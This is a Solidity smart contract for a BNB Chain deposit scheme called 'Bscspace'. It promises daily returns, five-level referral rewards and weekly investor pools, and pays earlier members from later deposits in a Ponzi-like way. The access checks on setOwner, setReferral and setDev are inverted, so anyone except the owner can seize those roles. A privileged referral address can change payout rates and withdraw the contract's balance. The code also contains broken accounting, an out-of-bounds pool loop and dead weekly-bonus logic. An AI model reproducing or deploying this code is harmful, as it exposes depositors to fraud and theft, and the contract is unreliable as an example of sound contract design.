/**
 *Submitted for verification at BscScan.com on 2022-10-12
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

contract Bscspace {
    using SafeMath for uint256;
    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public activedeposits;
    address public referral;
    address public owner;
    address public dev;
    uint private releaseTime;
    uint private interestRateDivisor = 1000000000000;
    uint private minDepositSize = 25000000000000000000; //25 USDT
    address[5] public topInvastorAddress;
    uint[5] public topInvastorAmount;
    uint public weeklyTime;
    uint256 public pool_cycle;
    uint8[] public pool_bonuses; 
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    uint public poolcount;
    Token token;
    address public tokenAddress; 
    uint256 public vel1 = 116000; //1%
    uint256 public vel2 = 174000; //1.5%
    uint256 public vel3 = 232000; //2%

 

    struct Player {
        uint tronDeposit;
        uint packageamount;
        uint totalDeposite;
        uint time;
        uint rTime;
        uint roi;
        uint roipaid;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom; 
        uint poolincome;
        uint gameCredit;
    }
    struct Lvl{
        uint lvl1count;
        uint lvl1total;
        uint lvl2count;
        uint lvl2total;
        uint lvl3count;
        uint lvl3total;
        uint lvl4count;
        uint lvl4total;
        uint lvl5count;
        uint lvl5total;
    }

    struct lvlroi{
        uint lvl1;
        uint lvl2;
        uint lvl3;
        uint lvl4;
        uint lvl5;
    }



    mapping(address => Player) public players;
    mapping(address => Lvl) public lvls;
    mapping(address => lvlroi) public lvlrois;
    

    event Newbie(address indexed user, address indexed _referrer, uint _time);  
	event NewDeposit(address indexed user, uint256 amount, uint _time);  
	event Withdrawn(address indexed user, uint256 amount, uint _time);  
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
    event Reinvest(address indexed user, uint256 amount, uint _time); 
    event Week(uint _time);
  
   
    constructor(address _token,address _referral,address _owner,address _dev) {
	    referral = _referral;
		owner = _owner;
        dev = _dev;        
        releaseTime = block.timestamp;
        weeklyTime = block.timestamp;
        _weekreset();

        tokenAddress = _token;
        token = Token(address(tokenAddress));

        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);

	}


    fallback() external payable {
        revert("Invalid Transaction");
    }

    receive() external payable {
         revert("Invalid Transaction");
    }

    function setOwner(address _owner) public {
        require(msg.sender != owner, "Invalid User!");
        owner = _owner;
    }
    function setReferral(address _referral) public {
        require(msg.sender != owner, "Invalid User!");
        referral = _referral;
    }
    function setDev(address _dev) public {
        require(msg.sender != owner, "Invalid User!");
        dev = _dev;
    }


    function deposit(address _affAddr,uint _amount) public payable {
        if (block.timestamp >= releaseTime){
        collect(msg.sender);
        
        }
        uint depositAmount = _amount;
        uint256 approvedAmt = token.allowance(msg.sender, address(this));
        require(approvedAmt >= depositAmount, "Check the token allowance");
        token.transferFrom(msg.sender, payable(address(this)), depositAmount);

        //minium deposit
        require(msg.sender != _affAddr, "Invalid Reffral!");
        require(depositAmount >= minDepositSize, "not minimum amount!");
        require(depositAmount > players[msg.sender].packageamount, "not minimum amount!");

        
        Player storage player = players[msg.sender];
        if (player.time == 0) {
            
            if (block.timestamp < releaseTime) {
               player.time = releaseTime; 
               player.rTime = releaseTime;
                
            }
            else{
               
               player.time = block.timestamp; 
               player.rTime = block.timestamp;
            }    
            totalPlayers++;
         
            if(_affAddr != address(0) && players[_affAddr].tronDeposit > 0){
                 emit Newbie(msg.sender, _affAddr, block.timestamp);
              register(msg.sender, _affAddr,depositAmount);
            }
            else{
                emit Newbie(msg.sender, owner, block.timestamp);
              register(msg.sender, owner,depositAmount);
            }
        }
        //player.rTime = block.timestamp;
        player.tronDeposit = player.tronDeposit.add(depositAmount);
        player.totalDeposite = player.totalDeposite.add(depositAmount);
        player.packageamount = depositAmount;
        distributeRef(depositAmount, player.affFrom);  
        
        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount); 
        _invastor(msg.sender,depositAmount);
        _pollDeposits(msg.sender, depositAmount);
        //payable(owner).transfer((depositAmount.mul(5)).div(100));


    }

       function _pollDeposits(address _addr, uint256 _amount) private {
        poolcount++;
        address upline = players[_addr].affFrom;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }


    function register(address _addr, address _affAddr,uint _depositAmount) private{
      
      uint depositAmount = _depositAmount;
      Player storage player = players[_addr];
      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
 
  
    lvls[_affAddr1].lvl1count = lvls[_affAddr1].lvl1count.add(1);
    lvls[_affAddr2].lvl2count = lvls[_affAddr2].lvl2count.add(1);
    lvls[_affAddr3].lvl3count = lvls[_affAddr3].lvl3count.add(1);
    lvls[_affAddr4].lvl4count = lvls[_affAddr4].lvl4count.add(1);
    lvls[_affAddr5].lvl5count = lvls[_affAddr5].lvl5count.add(1);

    lvls[_affAddr1].lvl1total = lvls[_affAddr1].lvl1total.add(depositAmount);
    lvls[_affAddr2].lvl2total = lvls[_affAddr2].lvl2total.add(depositAmount);
    lvls[_affAddr3].lvl3total = lvls[_affAddr3].lvl3total.add(depositAmount);
    lvls[_affAddr4].lvl4total = lvls[_affAddr4].lvl4total.add(depositAmount);
    lvls[_affAddr5].lvl5total = lvls[_affAddr5].lvl5total.add(depositAmount); 
    }

    function distributeRef(uint256 _trx, address _affFrom) private{
        uint256 _allaff = (_trx.mul(15)).div(100);
        address  _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom; 
        address _affAddr5 = players[_affAddr4].affFrom; 

         uint256 _affRewards = 0;
         if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(8)).div(100);
            _allaff = _allaff.sub(_affRewards);
           
           if (block.timestamp > releaseTime) {
               collect(_affAddr1);
                
            }

            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            players[_affAddr1].interestProfit = players[_affAddr1].interestProfit.add(_affRewards);
            emit RefBonus(_affAddr1, msg.sender, 1, _affRewards, block.timestamp);
    
          
        }

        if (_affAddr2 != address(0)) {
            if(lvls[_affAddr2].lvl1count > 1){
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);

            if (block.timestamp > releaseTime) {
               collect(_affAddr2);
                
            }
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            players[_affAddr2].interestProfit = players[_affAddr2].interestProfit.add(_affRewards);
            emit RefBonus(_affAddr2, msg.sender, 2, _affRewards, block.timestamp);

            }
            

        }

        if (_affAddr3 != address(0)) {
            if(lvls[_affAddr3].lvl1count > 3){
                _affRewards = (_trx.mul(2)).div(100);
                _allaff = _allaff.sub(_affRewards);
                if (block.timestamp > releaseTime) {
                    collect(_affAddr3);                
                }
                players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
                players[_affAddr3].interestProfit = players[_affAddr3].interestProfit.add(_affRewards);
                emit RefBonus(_affAddr3, msg.sender, 3, _affRewards, block.timestamp);
            }
        }

        if (_affAddr4 != address(0)) {
            if(lvls[_affAddr4].lvl1count > 5){
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (block.timestamp > releaseTime) {
               collect(_affAddr4);
                
            }
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            players[_affAddr4].interestProfit = players[_affAddr4].interestProfit.add(_affRewards);            
            emit RefBonus(_affAddr4, msg.sender, 3, _affRewards, block.timestamp);
            }
        }

        if (_affAddr5 != address(0)) {
            if(lvls[_affAddr5].lvl1count > 7){
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (block.timestamp > releaseTime) {
               collect(_affAddr5);
                
            }
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            players[_affAddr5].interestProfit = players[_affAddr5].interestProfit.add(_affRewards);             
            emit RefBonus(_affAddr5, msg.sender, 3, _affRewards, block.timestamp);
            }
        }
    }

    function PayReferral(address  payable ref, uint256 ref_amount) public {
	    require(msg.sender == referral, "USER not allowed!");
		ref.transfer(ref_amount);
	}

    function SetVel(uint256 _vel1,uint256 _vel2,uint256 _vel3 ) public {
	    require(msg.sender == referral, "USER not allowed!");
		vel1 = _vel1;
        vel2 = _vel2;
        vel3 = _vel3;
	}

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        //easypool(msg.sender, players[msg.sender].interestProfit);
        roureff(msg.sender, players[msg.sender].roi);
        transferPayout(msg.sender, players[msg.sender].interestProfit);
        
    }

    function reinvest() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        //easypool(msg.sender, players[msg.sender].interestProfit);
        roureff(msg.sender, players[msg.sender].roi);
        transferReinvest(msg.sender, players[msg.sender].interestProfit);        
    }

    function roureff (address _addr , uint _amount) internal {

      uint j=0;
      address l = players[_addr].affFrom; 
      uint payamount = _amount;

      for (j = 1 ; j <= 5; j++) {
         
        if (l != address(0)) {
            if(j==1){
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(15)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(15)).div(100));
                lvlrois[l].lvl1 = players[l].poolincome.add((payamount.mul(15)).div(100));
            }
            if(j==2){  
                if(lvls[l].lvl1count > 1){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(10)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(10)).div(100));
                lvlrois[l].lvl2 = players[l].poolincome.add((payamount.mul(10)).div(100));
                }
            }
            if(j==3){
                if(lvls[l].lvl1count > 3){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(5)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(5)).div(100));
                lvlrois[l].lvl3 = players[l].poolincome.add((payamount.mul(5)).div(100));
                }
            }
            if(j==4){   
                if(lvls[l].lvl1count > 5){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(3)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(3)).div(100));
                lvlrois[l].lvl4 = players[l].poolincome.add((payamount.mul(3)).div(100));
                }
            }
            if(j==5){
                if(lvls[l].lvl1count > 7){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(2)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(2)).div(100));
                lvlrois[l].lvl5 = players[l].poolincome.add((payamount.mul(2)).div(100));
                }
            }         
        }else{
            j = 6;
        }
         l = players[l].affFrom;        
      }

    } 
    
    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout);                

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.gameCredit = player.gameCredit.add(payout.mul(5).div(100));
                if(player.packageamount >= 25000000000000000000 && player.packageamount < 500000000000000000001){
                    player.tronDeposit = player.tronDeposit.sub(payout.div(25).mul(10));
                }else if(player.packageamount >= 500000000000000000001 && player.packageamount < 1000000000000000000001){
                    player.tronDeposit = player.tronDeposit.sub(payout.div(3));
                }else if(player.packageamount >= 1000000000000000000001){
                    player.tronDeposit = player.tronDeposit.sub(payout.div(35).mul(10));
                }else{
                    player.tronDeposit = player.tronDeposit;
                } 
                token.transfer(owner, (payout.mul(5)).div(100));
                token.transfer(msg.sender, (payout.mul(90)).div(100));
               // payable(owner).transfer((payout.mul(5)).div(100));
               // msg.sender.transfer((payout.mul(90)).div(100));
                emit Withdrawn(msg.sender, payout, block.timestamp);
            }
        }
    }

    function transferReinvest(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout);                

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.gameCredit = player.gameCredit.add(payout.mul(5).div(100));
                if(player.packageamount >= 25000000000000000000 && player.packageamount < 500000000000000000001){
                    player.tronDeposit = player.tronDeposit.sub(payout.div(25).mul(10));
                }else if(player.packageamount >= 500000000000000000001 && player.packageamount < 1000000000000000000001){
                    player.tronDeposit = player.tronDeposit.sub(payout.div(3));
                }else if(player.packageamount >= 1000000000000000000001){
                    player.tronDeposit = player.tronDeposit.sub(payout.div(35).mul(10));
                }else{
                    player.tronDeposit = player.tronDeposit;
                }
                //payable(owner).transfer((payout.mul(5)).div(100));
                token.transfer(owner, (payout.mul(5)).div(100));
                player.tronDeposit = player.tronDeposit.add((payout.mul(90)).div(100));
                player.totalDeposite = player.totalDeposite.add((payout.mul(90)).div(100));
                distributeRef((payout.mul(90)).div(100), player.affFrom);          
                totalInvested = totalInvested.add((payout.mul(90)).div(100));
                activedeposits = activedeposits.add((payout.mul(90)).div(100));  
                emit Reinvest(msg.sender, payout, block.timestamp);
            }
        }
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
    	uint256 vel = getvel(player.packageamount);
	
       uint secPassed = block.timestamp.sub(player.time);
       if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.totalDeposite.mul(secPassed.mul(vel))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.roi = collectProfit;
            player.roipaid = player.roipaid.add(collectProfit);

           //100 
            if(player.packageamount >= 25000000000000000000 && player.packageamount < 500000000000000000001){
                if (player.interestProfit >= player.tronDeposit.mul(25).div(10)){
                    player.interestProfit = player.tronDeposit.mul(25).div(10);
                }
            }
            if(player.packageamount >= 500000000000000000001 && player.packageamount < 1000000000000000000001){
                if (player.interestProfit >= player.tronDeposit.mul(3)){
                    player.interestProfit = player.tronDeposit.mul(3);
                }
            }
            if(player.packageamount >= 1000000000000000000001){
                if (player.interestProfit >= player.tronDeposit.mul(35).div(10)){
                    player.interestProfit = player.tronDeposit.mul(35).div(10);
                }
            }
            
            player.time = player.time.add(secPassed);
       }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);
        if ( block.timestamp < releaseTime){
        return 0;   
        }
        else{
            uint secPassed = block.timestamp.sub(player.time);
            uint256 vel = getvel(player.packageamount);
            uint collectProfit =0 ;
            if (secPassed > 0) {
                collectProfit = (player.tronDeposit.mul(secPassed.mul(vel))).div(interestRateDivisor);
            }

            if(player.packageamount >= 25000000000000000000 && player.packageamount < 500000000000000000001){
                if (collectProfit.add(player.interestProfit) >= player.tronDeposit.mul(25).div(10)){
                    return player.tronDeposit.mul(25).div(10);
                }else{
                    return collectProfit.add(player.interestProfit);
                }
            }else if(player.packageamount >= 500000000000000000001 && player.packageamount < 1000000000000000000001){
                if (collectProfit.add(player.interestProfit) >= player.tronDeposit.mul(3)){
                    return player.tronDeposit.mul(3);
                }else{
                    return collectProfit.add(player.interestProfit);
                }
            }else if(player.packageamount >= 1000000000000000000001){
                if (collectProfit.add(player.interestProfit) >= player.tronDeposit.mul(35).div(10)){
                    return player.tronDeposit.mul(35).div(10);
                }else{
                    return collectProfit.add(player.interestProfit);
                }
            }else{
                return 0;
            }       
        }
    }

    function getvel(uint _tronDeposit) public view returns (uint256) { 
        uint256 vel = vel1; //1%
        if(_tronDeposit > 2000000000){
            vel = vel2; //1.50%
        }
        if(_tronDeposit >= 6000000000){
            vel = vel3; //2%
        }
        return vel;
	}

    function _invastor(address _affAddr,uint _amount) internal  {
 
      for (uint j = 0; j < 5; j++) {  //for loop example
        if(topInvastorAmount[j] < _amount){            
            for(uint i = 4;i > j;i--){               
                uint k = i - 1;
                if(topInvastorAmount[k] != 0){
                    topInvastorAddress[i] = topInvastorAddress[k];
                    topInvastorAmount[i] = topInvastorAmount[k];
                }
            }
            topInvastorAddress[j] = _affAddr;
            topInvastorAmount[j] = _amount;
            j=5;
        }       
      }    

    }

    function gettopInvastorAmount() public view returns (uint[5] memory) {
        return topInvastorAmount;
    }

    function gettopInvastorAddress() public view returns (address[5] memory) {
        return topInvastorAddress;
    }

    function _weekreset() internal {
        pool_cycle++;
        for (uint j = 0; j < 5; j++) {  //for loop example
            topInvastorAddress[j] = address(0);
            topInvastorAmount[j] = 0;       
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function _weekcheck() internal {
        uint time = weeklyTime.add(604800); //7day added
        if(time < block.timestamp){
            uint weekinvest = activedeposits.mul(2).div(100);
            uint weekspon = activedeposits.mul(2).div(100);           
            if(topInvastorAmount[0] == 0){                
                uint amt =(weekinvest.mul(50)).div(100);
                players[topInvastorAddress[0]].interestProfit = players[topInvastorAddress[0]].interestProfit.add(amt);       
            }
            if(topInvastorAmount[1] == 0){
                uint amt =(weekinvest.mul(25)).div(100);
                players[topInvastorAddress[1]].interestProfit = players[topInvastorAddress[1]].interestProfit.add(amt);               
            }  
            if(topInvastorAmount[2] == 0){
                uint amt =(weekinvest.mul(15)).div(100);
                players[topInvastorAddress[2]].interestProfit = players[topInvastorAddress[2]].interestProfit.add(amt);               
            }  
            if(topInvastorAmount[3] == 0){
                uint amt =(weekinvest.mul(10)).div(100);
                players[topInvastorAddress[3]].interestProfit = players[topInvastorAddress[3]].interestProfit.add(amt);
            }

            if(pool_top[0] != address(0)){                
                uint amt =(weekspon.mul(50)).div(100);
                players[pool_top[0]].interestProfit = players[pool_top[0]].interestProfit.add(amt);       
            }
            if(pool_top[1] != address(0)){
                uint amt =(weekspon.mul(25)).div(100);
                players[pool_top[1]].interestProfit = players[pool_top[1]].interestProfit.add(amt);               
            }  
            if(pool_top[2] != address(0)){
                uint amt =(weekspon.mul(15)).div(100);
                players[pool_top[2]].interestProfit = players[pool_top[2]].interestProfit.add(amt);               
            }  
            if(pool_top[3] != address(0)){
                uint amt =(weekspon.mul(10)).div(100);
                players[pool_top[3]].interestProfit = players[pool_top[3]].interestProfit.add(amt);
            }

            _weekreset();                  
            weeklyTime = block.timestamp;
            emit Week(block.timestamp);
        }
        
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }


}
library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract Token {
   mapping(address => uint256) balances;
   mapping(address => mapping (address => uint256)) allowed;
   string name_;
   string symbol_;
   uint256 totalSupply_;   constructor(string memory _name, string memory _symbol, uint256 _total) {
      name_ = _name;
      symbol_ = _symbol;
      totalSupply_ = _total;
      balances[msg.sender] = totalSupply_;
   }
   
   function name() public view returns (string memory) {
      return name_;
   }   function symbol() public view returns (string memory) {
      return symbol_;
   }   function totalSupply() public view returns (uint256) {
      return totalSupply_;
   }   function balanceOf(address tokenOwner) public view returns (uint) {
      return balances[tokenOwner];
   }   function decimals() public pure returns(uint8) {
      return 18;
   }   function transfer(address _receiver, uint _amount) public returns (bool) {
      require(_amount <= balances[msg.sender]);
      balances[msg.sender] -= _amount;
      balances[_receiver] += _amount;
      return true;
   }   function approve(address _delegate, uint _amount) public returns (bool) {
      allowed[msg.sender][_delegate] = _amount;
      return true;
   }   function allowance(address _owner, address _delegate) public view returns (uint) {
      return allowed[_owner][_delegate];
   }   function transferFrom(address _owner, address _receiver, uint _amount) public returns (bool) {
      require(_amount <= balances[_owner]);
      require(_amount <= allowed[_owner][msg.sender]);          
      balances[_owner] -= _amount;
      allowed[_owner][msg.sender] -= _amount;
      balances[_receiver] += _amount;
      return true; 
   }
   
}